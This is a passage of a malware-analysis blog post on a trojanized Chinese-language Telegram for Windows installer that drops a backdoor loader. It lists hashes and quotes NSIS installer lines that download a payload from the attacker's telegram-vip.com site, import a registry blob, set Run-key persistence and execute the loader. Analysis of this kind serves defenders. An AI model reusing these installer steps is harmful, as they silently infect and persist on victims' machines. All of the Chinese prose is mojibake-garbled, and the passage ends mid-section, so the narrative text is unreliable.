<meta property="og:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg">
<meta property="article:published_time" content="2020-10-25T17:01:39.000Z">
<meta property="article:modified_time" content="2025-01-17T13:11:17.282Z">
<meta property="article:author" content="Theo Chen">
<meta property="article:tag" content="Malware">
<meta property="article:tag" content="Telegram">
<meta property="article:tag" content="Trojan">
<meta property="article:tag" content="gh0st RAT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg">
<meta name="twitter:creator" content="@The0_Klein">
    
    
        
    
    
    
        <meta property="og:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/thumb-min.jpg"/>
        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/thumb-min.jpg"/>
    
    
        <meta property="og:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg"/>
        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg"/>
    
    
    <!--STYLES-->
    
<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">

    <!--STYLES END-->
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-106120242-2');
    </script>


    

    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
    

<header id="header" data-behavior="2">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            &lt;Theo/&gt;
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="Open the link: /#about"
            >
        
        
            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->


    

<nav id="sidebar" data-behavior="2">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a
                    href="/#about"
                    aria-label="Read more about the author"
                >
                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">Theo Chen</h4>
                
                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="Home"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="Categories"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="Tags"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="Archives"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="About"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/TheoKlein"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/The0_Klein"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://www.linkedin.com/in/theo-chen/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="LinkedIn"
                        >
                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">LinkedIn</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="mailto:theokleintw@gmail.com"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Mail"
                        >
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Mail</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/rss2.xml"
                            
                            rel="noopener"
                            title="RSS"
                        >
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
        <div class="post-header-cover
                    text-center
                    "
             style="background-image:url('/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg');"
             data-behavior="2">
            
        </div>

            <div id="main" data-behavior="2"
                 class="hasCover
                        hasCoverMetaOut
                        ">
                
<article class="post">
    
    
        <div class="post-header main-content-wrap text-center">
    
        <h1 class="post-title">
            åˆ†æä¸€å€‹åŠ æ–™çš„ Telegram for Windows ä¸­æ–‡ç‰ˆå®‰è£ç¨‹å¼
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2020-10-25T17:01:39+00:00">
	
		    Oct 25, 2020
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/Research/">Research</a>


    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p>ç´€éŒ„ä¸€ä¸‹åˆ†æä¸€å€‹è¢«é‡æ–°æ‰“åŒ…åŠ æ–™éçš„ä¸­æ–‡ç‰ˆ Telegram å®‰è£ç¨‹å¼çš„éç¨‹å’Œç™¼ç¾çš„æ±è¥¿ã€‚</p>
<span id="more"></span>

<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85%E5%8A%A0%E6%96%99%E9%81%8E%E7%9A%84%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F"><span class="toc-text">é‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BC%89%E5%85%A5%E5%99%A8-AddInProcess-exe"><span class="toc-text">è¼‰å…¥å™¨ AddInProcess.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Assembly-Load-Malware-dll"><span class="toc-text">Assembly.Load(Malware.dll)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hello-gh0st-RAT-DLL"><span class="toc-text">Hello gh0st RAT DLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E4%BC%B8%E8%AA%BF%E6%9F%A5"><span class="toc-text">å»¶ä¼¸èª¿æŸ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%B5%90"><span class="toc-text">å°çµ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IoCs"><span class="toc-text">IoCs</span></a></li></ol>

<hr>
<p>æœ€åˆçš„æ¨£æœ¬ä¾†è‡ª <code>http://telegram-vip[.]com</code>ï¼Œä¸€å€‹ä¸­æ–‡ç‰ˆ Telegram çš„ä»‹ç´¹å’Œä¸‹è¼‰ç¶²ç«™ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p1.png" title="Figure 1. å‡çš„ä¸­æ–‡ç‰ˆ Telegram ç¶²ç«™" data-caption="Figure 1. å‡çš„ä¸­æ–‡ç‰ˆ Telegram ç¶²ç«™" data-fancybox="default"><img class="fig-img" src="p1.png" alt="Figure 1. å‡çš„ä¸­æ–‡ç‰ˆ Telegram ç¶²ç«™"></a><span class="caption">Figure 1. å‡çš„ä¸­æ–‡ç‰ˆ Telegram ç¶²ç«™</span></div>

<p>ç¶²ç«™é¦–é å°±æœ‰å„ç‰ˆæœ¬çš„ä¸‹è¼‰é€£çµï¼Œä½†å…¶ä¸­é¦–é ä¸‹è¼‰ <code>Telegram for Mac</code> å’Œ <code>Telegram for windows</code> çš„é€£çµéƒ½æœƒæ˜¯ä¸‹è¼‰è¢«åŠ æ–™éçš„ Windows å®‰è£ç¨‹å¼ï¼ˆå¯«é€™ç¯‡æ–‡ç« çš„æ™‚å€™ä¸‹è¼‰çš„æª”æ¡ˆæ˜¯ <code>tsetup.2.1.10.exe</code>ï¼‰ã€‚é»é¸ Android æˆ– iPhone çš„ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹ä¸‹è¼‰çš„é é¢ï¼š</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p2.png" title="Figure 2. ä¸‹è¼‰é é¢" data-caption="Figure 2. ä¸‹è¼‰é é¢" data-fancybox="default"><img class="fig-img" src="p2.png" alt="Figure 2. ä¸‹è¼‰é é¢"></a><span class="caption">Figure 2. ä¸‹è¼‰é é¢</span></div>
<p>é€™é‚Šå°±æœ‰äº›ä¸åŒäº†ï¼š</p>
<ul>
<li>iPhone ä¸‹è¼‰çš„é€£çµæœƒé€£å›åˆ°æ­£å¸¸çš„ Apple App Store <code>https://apps.apple.com/app/telegram-messenger/id686449807</code></li>
<li>Android ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹é€£çµä¸‹è¼‰æª”æ¡ˆ <code>https://telegrcn.org/download/telegramCN_631.apk</code></li>
<li>Mac ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹é€£çµä¸‹è¼‰æª”æ¡ˆ <code>https://telegrcn.org/download/tsetup.2.1.10.dmg</code></li>
<li>Windows ç‰ˆæœ¬è·Ÿé¦–é ä¸‹è¼‰çš„æª”æ¡ˆä¸€æ¨£</li>
</ul>
<p>æ¥ä¸‹ä¾†é€™ç¯‡æ–‡ç« æœƒåªé‡å° Windows çš„ç‰ˆæœ¬æ•˜è¿°ï¼Œé€™å€‹å‡çš„ç¶²ç«™åœ¨ä»Šå¹´ 9 æœˆæ™‚å°±å·²ç¶“åœ¨ Twitter ä¸Šæœ‰ç›¸é—œçš„è¨è«–ï¼ŒAndroid ç‰ˆæœ¬çš„ APK ä¹Ÿå·²çŸ¥æ˜¯å‡çš„ APPï¼Œæˆ‘åœ¨å¿«åˆ†æå®Œäº†æ‰æŸ¥åˆ°é€™å€‹è³‡æ–™ ğŸ˜¢ï¼Œå†æ¬¡å­¸åˆ°æ•™è¨“æŠŠé ­åŸ‹é€²é€†å‘ä¹‹å‰é‚„æ˜¯è¦å¥½å¥½çš„æŠŠè¨Šæ¯è’é›†è·Ÿèª¿æŸ¥åšå¥½ã€‚</p>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Interesting, signed, low detected &quot;telegram_setup.2.1.6.exe&quot;: 8c957cfced1bcf7803f810d6ae5a6d13cce005637be3ed40a311793419cd92c1<br>From: http://telegram-vip[.]com/telegram_setup.2.1.6.exe<br>Seems some Chinese speaker made malware, targeting Chinese people.<br>ğŸ¤”<br>cc <a target="_blank" rel="noopener" href="https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw">@JAMESWT_MHT</a> <a target="_blank" rel="noopener" href="https://twitter.com/cyb3rops?ref_src=twsrc%5Etfw">@cyb3rops</a> <a target="_blank" rel="noopener" href="https://t.co/5jAtnQCkjx">pic.twitter.com/5jAtnQCkjx</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a target="_blank" rel="noopener" href="https://twitter.com/malwrhunterteam/status/1310508328041283584?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>ä¸éé›–ç„¶å·²ç¶“æœ‰è¨è«–ä¸²å‡ºç¾ï¼Œä½†ç¾åœ¨çœ‹åˆ°çš„ç‰ˆæœ¬å·²ç¶“ä¾†åˆ°äº† <code>2.1.10</code>ï¼Œé€™è®“æˆ‘å¥½å¥‡æƒ³è¦ä¾†æ¯”è¼ƒä¸€ä¸‹è·Ÿä¹æœˆæ™‚çš„ <code>2.1.6</code> ç‰ˆæœ¬æœ‰äº†ä»€éº¼è®ŠåŒ–ã€‚æ¥ä¸‹ä¾†æœƒç”¨æˆ‘æ‰‹ä¸Šæœ‰çš„ <code>telegram_setup.2.1.10.exe</code> è·Ÿæˆ‘åœ¨ ANY.RUN é€™å€‹<a target="_blank" rel="noopener" href="https://app.any.run/tasks/aeb405ec-3fea-475f-9050-5ad0a5cf1c61/">åˆ†æ</a>æ‰¾åˆ°çš„ <code>telegram_setup.2.1.6.exe</code> ç›¸é—œæª”æ¡ˆä¾†åšæ¯”è¼ƒã€‚</p>
<h2 id="é‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼"><a href="#é‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼" class="headerlink" title="é‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼"></a>é‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼</h2><table>
<thead>
<tr>
<th>Filename</th>
<th>SHA256</th>
</tr>
</thead>
<tbody><tr>
<td>telegram_setup.2.1.6.exe</td>
<td>1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8</td>
</tr>
<tr>
<td>telegram_setup.2.1.10.exe</td>
<td>35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba</td>
</tr>
</tbody></table>
<p>é€™å…©å€‹å®‰è£ç¨‹å¼éƒ½æ˜¯ç”¨ NSIS (<a target="_blank" rel="noopener" href="https://nsis.sourceforge.io/Main_Page">nullsoft scriptable install system</a>) æ‰“åŒ…çš„ï¼Œå¯ä»¥åˆ©ç”¨ 7-zip ç›´æ¥è§£å£“ç¸®å°±èƒ½å¾—åˆ°é‚„åŸçš„å®‰è£è…³æœ¬ <code>[NSIS].nsi</code>ã€‚7-zip åœ¨ <code>9.33</code> çš„ç‰ˆæœ¬åŠ å…¥äº†è‡ªå‹•åç·¨è­¯ NSIS è…³æœ¬çš„åŠŸèƒ½ï¼Œä½†åˆåœ¨ <code>15.06</code> æŠŠé€™å€‹åŠŸèƒ½æ‹¿æ‰äº†ï¼Œæ‰€ä»¥è¦æ³¨æ„ 7-zip ç‰ˆæœ¬å¿…é ˆä»‹æ–¼é€™å…©è€…ä¹‹é–“ã€‚</p>
<p>è§£é–‹ä»¥å¾Œå…©å€‹ç‰ˆæœ¬çš„ç›®éŒ„çµæ§‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">2.1.6/</span><br><span class="line">â”œâ”€â”€ $PLUGINSDIR                        // NSIS ç›¸é—œçš„æª”æ¡ˆ</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InstallOptions.dll</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ioSpecial.ini</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ LangDLL.dll</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ modern-wizard.bmp</span><br><span class="line">â”‚Â Â  â””â”€â”€ TextReplace.dll</span><br><span class="line">â”œâ”€â”€ C                                  // å®‰è£éç¨‹ä¸­æœƒç›´æ¥è¤‡è£½åˆ°å°æ‡‰çš„ä½ç½®çš„æª”æ¡ˆ</span><br><span class="line">â”‚Â Â  â””â”€â”€ PerfLog</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ AddInProcess.exe           // Backdoor (Loader)</span><br><span class="line">â”‚Â Â      â””â”€â”€ AddInProcess.exe.config</span><br><span class="line">â”œâ”€â”€ [NSIS].nsi                         // 7-zip è§£å‡ºä¾†çš„ NSIS è…³æœ¬</span><br><span class="line">â”œâ”€â”€ ns.reg                             // Payload Registry File</span><br><span class="line">â”œâ”€â”€ Telegram.exe                       // Telegram Desktop 2.1.6.0</span><br><span class="line">â”œâ”€â”€ uninst.exe.nsis</span><br><span class="line">â””â”€â”€ Updater.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2.1.10/</span><br><span class="line">â”œâ”€â”€ $PLUGINSDIR                        // NSIS ç›¸é—œçš„æª”æ¡ˆ</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InetLoad.dll</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InstallOptions.dll</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ioSpecial.ini</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ LangDLL.dll</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ modern-wizard.bmp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ System.dll</span><br><span class="line">â”‚Â Â  â””â”€â”€ TextReplace.dll</span><br><span class="line">â”œâ”€â”€ [NSIS].nsi                         // 7-zip è§£å‡ºä¾†çš„ NSIS è…³æœ¬</span><br><span class="line">â”œâ”€â”€ Telegram.exe                       // Telegram Desktop 2.1.6.0</span><br><span class="line">â”œâ”€â”€ uninst.exe.nsis</span><br><span class="line">â””â”€â”€ Updater.exe</span><br></pre></td></tr></table></figure>

<p>å°æ¯”å…©å€‹ç‰ˆæœ¬å¯ä»¥å¾ˆæ˜é¡¯çš„æ³¨æ„åˆ° <code>2.1.10</code> å°‘äº† <code>C:\PerfLog</code> è·Ÿ <code>ns.reg</code> é—œéµçš„å¾Œé–€æª”æ¡ˆï¼Œ<code>2.1.6</code> å¾ˆç›´æ¥çš„å°±æŠŠé€™äº›æª”æ¡ˆä¸€èµ·æ‰“åŒ…ï¼Œ<code>2.1.10</code> æ”¹è®Šæ–¹å¼ï¼Œåˆ©ç”¨ NSIS è…³æœ¬åœ¨å®‰è£éç¨‹ä¸­æ‰å°‡é€™å…©å€‹æª”æ¡ˆä¸‹è¼‰ä¸‹ä¾†ï¼Œé€™å¯ä»¥åœ¨ <code>[NSIS].nis</code> è…³æœ¬ä¸­çœ‹åˆ°ï¼Œä¸‹é¢æ˜¯å¾ <code>2.1.10</code> çš„ <code>[NSIS].nsi</code> è…³æœ¬ä¸­ç¯€éŒ„éƒ¨ä»½ç›¸é—œçš„æŒ‡ä»¤ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download loader and registry file</span></span><br><span class="line">InetLoad::load /BANNER <span class="string">&quot;&quot;</span> <span class="string">&quot;Cameron Diaz download in progress, please wait ;)&quot;</span> http://www.telegram-vip.com/index2.php cnPath.exe</span><br><span class="line">InetLoad::load /BANNER <span class="string">&quot;&quot;</span> <span class="string">&quot;Cameron Diaz download in progress, please wait ;)&quot;</span> http://www.telegram-vip.com/index3.php ns.reg</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Replace 123456 to &lt;ComputerName&gt; from ns.reg then use regedit.exe to import</span></span><br><span class="line">ReadRegStr <span class="variable">$R1</span> HKLM SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName ComputerName</span><br><span class="line">TextReplace::_FindInFile /NOUNLOAD <span class="variable">$INSTDIR</span>\ns.reg 123456 /S=1</span><br><span class="line">TextReplace::_ReplaceInFile /NOUNLOAD <span class="variable">$INSTDIR</span>\ns.reg <span class="variable">$INSTDIR</span>\ns.reg 123456 <span class="variable">$R1</span> <span class="string">&quot;/S=1 /C=1 /AO=1&quot;</span></span><br><span class="line">Exec <span class="string">&quot;regedit.exe /s $\&quot;<span class="variable">$INSTDIR</span>\ns.reg$\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Move $INSTDIR\cnPath.exe to C:\PerfLog\AddInProcess.exe</span></span><br><span class="line">StrCpy <span class="variable">$R0</span> <span class="variable">$INSTDIR</span>\cnPath.exe</span><br><span class="line">StrCpy <span class="variable">$R1</span> C:\PerfLog\AddInProcess.exe</span><br><span class="line">System::Call <span class="string">&quot;Kernel32::MoveFileA(t R0,t R1)&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Setup service registry and run</span></span><br><span class="line">WriteRegStr HKCU Software\Microsoft\Windows\CurrentVersion\Run telegramCnService C:\PerfLog\AddInProcess.exe</span><br><span class="line">ExecShell <span class="string">&quot;&quot;</span> C:\PerfLog\AddInProcess.exe</span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬ä¸Šçœ‹å®Œ NSIS è…³æœ¬å°±èƒ½äº†è§£å®ƒçš„æ„ŸæŸ“æ‰‹æ®µè·ŸæŒä¹…åŒ–çš„æ–¹å¼ã€‚</p>
<h2 id="è¼‰å…¥å™¨-AddInProcess-exe"><a href="#è¼‰å…¥å™¨-AddInProcess-exe" class="headerlink" title="è¼‰å…¥å™¨ AddInProcess.exe"></a>è¼‰å…¥å™¨ AddInProcess.exe</h2><p>çŸ¥é“å®‰è£éç¨‹å‹•çš„æ‰‹è…³ä»¥å¾Œï¼Œç›®æ¨™å°±å¾ˆæ˜ç¢ºäº†ï¼Œ<code>AddInProcess.exe</code> è·Ÿå¯«å…¥çš„ Registry è³‡æ–™ã€‚</p>
<table>
<thead>
<tr>
<th>Filename</th>
<th>SHA256</th>
</tr>
</thead>
<tbody><tr>
<td>AddInProcess.exe (2.1.6)</td>
<td>f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063</td>
</tr>
<tr>
<td>AddInProcess.exe (2.1.10)</td>
<td>379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811</td>
</tr>
</tbody></table>
<p>åŸºæœ¬ä¸Šå…©å€‹çš„å‡½å¼å…§å®¹ä¸¦æ²’æœ‰ä¸åŒï¼Œåƒ…æœ‰ metadata æ”¹è®Šè€Œå·²ï¼ŒFile Version å¾ <code>1.0.0.0</code> è®Šæˆ <code>1.3.0.0</code>ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p3.png" title="Figure 3. å…©è€…çš„æª”æ¡ˆåŸºæœ¬è¨Šæ¯" data-caption="Figure 3. å…©è€…çš„æª”æ¡ˆåŸºæœ¬è¨Šæ¯" data-fancybox="default"><img class="fig-img" src="p3.png" alt="Figure 3. å…©è€…çš„æª”æ¡ˆåŸºæœ¬è¨Šæ¯"></a><span class="caption">Figure 3. å…©è€…çš„æª”æ¡ˆåŸºæœ¬è¨Šæ¯</span></div>
<div class="figure center" style="width:;"><a class="fancybox" href="p4.png" title="Figure 4. ç›¸åŒçš„ .NET å‡½å¼çµæ§‹" data-caption="Figure 4. ç›¸åŒçš„ .NET å‡½å¼çµæ§‹" data-fancybox="default"><img class="fig-img" src="p4.png" alt="Figure 4. ç›¸åŒçš„ .NET å‡½å¼çµæ§‹"></a><span class="caption">Figure 4. ç›¸åŒçš„ .NET å‡½å¼çµæ§‹</span></div>
<div class="figure center" style="width:;"><a class="fancybox" href="p5.png" title="Figure 5. ç›¸åŒçš„ Main å‡½å¼" data-caption="Figure 5. ç›¸åŒçš„ Main å‡½å¼" data-fancybox="default"><img class="fig-img" src="p5.png" alt="Figure 5. ç›¸åŒçš„ Main å‡½å¼"></a><span class="caption">Figure 5. ç›¸åŒçš„ Main å‡½å¼</span></div>

<p>å¾ Figure 5. çš„ Main å‡½å¼å°±å¯ä»¥çŸ¥é“ï¼Œ<code>AddInProcess.exe</code> åªæ˜¯å€‹è¼‰å…¥å™¨ï¼ŒçœŸæ­£çš„å…§å®¹åœ¨å®‰è£æ™‚åŒ¯å…¥çš„ registry è³‡æ–™è£¡ï¼Œä½åœ¨ <code>HKEY_CURRENT_USER\Software\&lt;COMPUTERNAME&gt;</code>è£¡é¢æ˜¯ base64 ç·¨ç¢¼éçš„ DLL å’Œä¸€å€‹ ip ä½å€ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p6.png" title="Figure 6. Registry çš„å…§å®¹" data-caption="Figure 6. Registry çš„å…§å®¹" data-fancybox="default"><img class="fig-img" src="p6.png" alt="Figure 6. Registry çš„å…§å®¹"></a><span class="caption">Figure 6. Registry çš„å…§å®¹</span></div>

<h2 id="Assembly-Load-Malware-dll"><a href="#Assembly-Load-Malware-dll" class="headerlink" title="Assembly.Load(Malware.dll)"></a>Assembly.Load(Malware.dll)</h2><p>è—‰åŠ© .NET çš„ <code>Assembly.Load</code> å‡½å¼å¯ä»¥å‹•æ…‹è¼‰å…¥å¦ä¸€å€‹ .NET çš„ DLLï¼Œä¹Ÿå°±æ˜¯ registry çš„å…§å®¹ï¼Œæˆ‘å€‘å¯ä»¥æå–å‡ºä¾†é€²ä¸€æ­¥åˆ†æã€‚</p>
<table>
<thead>
<tr>
<th>Filename</th>
<th>Compile Time</th>
<th>SHA256</th>
</tr>
</thead>
<tbody><tr>
<td>ns.reg (2.1.6)</td>
<td>N&#x2F;A</td>
<td>96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22</td>
</tr>
<tr>
<td>registry.bin (2.1.6)</td>
<td>2020-09-23T09:43:39</td>
<td>7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a</td>
</tr>
<tr>
<td>ns.reg (2.1.10)</td>
<td>N&#x2F;A</td>
<td>d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a</td>
</tr>
<tr>
<td>registry.bin (2.1.10)</td>
<td>2020-09-28T18:16:01</td>
<td>e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>PDB Path</th>
</tr>
</thead>
<tbody><tr>
<td>D:\source\MyJob\åå°„dll\ConsoleApplication2\obj\Release\åå°„.pdb</td>
</tr>
</tbody></table>
<blockquote>
